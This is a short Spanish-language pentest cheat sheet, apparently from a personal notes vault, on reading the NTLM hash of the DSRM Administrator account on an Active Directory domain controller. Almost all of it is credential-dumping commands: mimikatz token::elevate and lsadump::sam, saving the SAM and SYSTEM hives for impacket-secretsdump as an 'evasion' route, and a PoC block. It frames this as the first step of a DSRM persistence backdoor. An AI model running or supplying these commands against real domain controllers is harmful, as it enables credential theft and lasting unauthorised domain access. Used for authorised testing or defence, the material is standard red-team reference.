---
aliases:
  - DSRM Hash Read
tags:
  - technique/credential-access
  - asset/active-directory
  - env/windows
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[DSRM Backdoor]]"
---
# DSRM Backdoor - Lectura del Hash

> La cuenta DSRM es el `Administrator` del **SAM local del DC** (no de AD). Leer su hash requiere admin en el DC.

---

## Leer el Hash DSRM

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mimikatz # token::elevate` + `lsadump::sam` | Hash NTLM de la cuenta DSRM (`Administrator` del SAM local) | En el DC, como admin. |
| `mimikatz # lsadump::sam /patch` | Igual vía patch del SAM | Alternativa. |
| `reg save HKLM\SAM sam.save` + `reg save HKLM\SYSTEM sys.save` → `impacket-secretsdump -sam sam.save -system sys.save LOCAL` | Hash DSRM offline desde los hives | Sin mimikatz / evasión. |
| `Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior` | Estado actual del flag DSRM | Ver si ya está habilitado. |
^dsrm-read-hash

### PoC

```text
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
:: Buscar la entrada "Administrator" → su NTLM es el hash DSRM
```

---

> Habilitar el backdoor y reusar el hash: [[DSRM Backdoor - Backdoor y Re-entry]].
